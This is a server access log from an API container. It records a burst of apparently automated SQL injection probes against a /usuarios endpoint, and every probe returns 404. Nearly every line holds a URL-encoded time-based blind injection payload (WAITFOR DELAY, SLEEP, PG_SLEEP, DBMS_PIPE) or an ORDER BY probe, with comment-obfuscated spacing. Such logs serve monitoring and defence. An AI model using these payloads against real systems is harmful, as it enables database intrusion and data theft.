api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:59684 - "GET /usuarios%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59690 - "GET /usuarios%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2887%29%7C%7CCHR%2883%29%7C%7CCHR%28121%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59698 - "GET /usuarios%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2887%29%7C%7CCHR%2883%29%7C%7CCHR%28121%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59714 - "GET /usuarios%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2887%29%7C%7CCHR%2883%29%7C%7CCHR%28121%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59730 - "GET /usuarios%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2887%29%7C%7CCHR%2883%29%7C%7CCHR%28121%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59746 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/9753/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Nmbk%29/%2A%2A/AND/%2A%2A/%284824%3D4824 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59752 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/9753/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Nmbk%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59722 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/9753/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Nmbk%29/%2A%2A/AND/%2A%2A/%28%27DwbQ%27%3D%27DwbQ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59762 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/9753/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Nmbk%29/%2A%2A/AND/%2A%2A/%27SnhF%27%3D%27SnhF HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59772 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/9753/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29Nmbk%29--/%2A%2A/PiAb HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59774 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/3812%3D%28SELECT/%2A%2A/3812/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%287416%3D7416 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59788 - "GET /usuarios/%2A%2A/AND/%2A%2A/3812%3D%28SELECT/%2A%2A/3812/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59800 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/3812%3D%28SELECT/%2A%2A/3812/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27xqaC%27%3D%27xqaC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59802 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/3812%3D%28SELECT/%2A%2A/3812/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27zrsV%27%3D%27zrsV HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59818 - "GET /usuarios/%2A%2A/AND/%2A%2A/3812%3D%28SELECT/%2A%2A/3812/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/xGfl HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59822 - "GET /usuarios%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%282727%3D2727 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59828 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59840 - "GET /usuarios%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27xWuF%27%3D%27xWuF HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59846 - "GET /usuarios%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27qAMj%27%3D%27qAMj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59850 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/PIKY HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59866 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/5169%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2886%29%7C%7CCHR%2885%29%7C%7CCHR%2880%29%2C5%29/%2A%2A/AND/%2A%2A/%287295%3D7295 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59874 - "GET /usuarios/%2A%2A/AND/%2A%2A/5169%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2886%29%7C%7CCHR%2885%29%7C%7CCHR%2880%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59876 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/5169%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2886%29%7C%7CCHR%2885%29%7C%7CCHR%2880%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27rqyp%27%3D%27rqyp HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59892 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/5169%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2886%29%7C%7CCHR%2885%29%7C%7CCHR%2880%29%2C5%29/%2A%2A/AND/%2A%2A/%27UGLe%27%3D%27UGLe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59896 - "GET /usuarios/%2A%2A/AND/%2A%2A/5169%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2886%29%7C%7CCHR%2885%29%7C%7CCHR%2880%29%2C5%29--/%2A%2A/LpJl HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59900 - "GET /usuarios%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/BxFG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59910 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/xzDt HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59924 - "GET /usuarios%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/qoVa HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59940 - "GET /usuarios%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/hHAE HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59954 - "GET /usuarios/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/qBKW HTTP/1.1" 404 Not Found
